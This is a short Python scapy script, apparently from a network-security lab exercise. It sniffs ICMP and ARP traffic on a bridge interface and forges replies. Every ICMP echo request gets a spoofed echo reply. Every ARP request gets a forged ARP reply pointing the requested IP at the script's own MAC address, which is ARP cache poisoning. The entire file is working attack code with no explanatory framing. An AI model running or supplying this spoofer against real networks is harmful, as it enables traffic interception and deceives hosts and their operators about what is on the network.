#!/usr/bin/env python3

from scapy.all import *

def spoof(pkt):
    dst = pkt[1].dst
    src = pkt[1].src
    seq = pkt[2].seq
    id = pkt[2].id
    load = pkt[3].load
    reply = IP(src=dst, dst=src) / ICMP(type=0, id=id, seq=seq) / load
    send(reply)

myMAC = "02:42:18:db:74:69"

def get_arp(pkt): 
    if pkt[ARP].op == 1:
        reply = ARP(op=2, psrc=pkt[ARP].pdst, hwdst=myMAC, pdst=pkt[ARP].psrc)
        send(reply, verbose=False)

def print_pkt(pkt):
    if ARP in pkt:
        get_arp(pkt)
    elif pkt[2].type == 8:
        spoof(pkt)

pkt = sniff(iface="br-1a9996b508c9", filter="icmp or arp", prn=print_pkt)
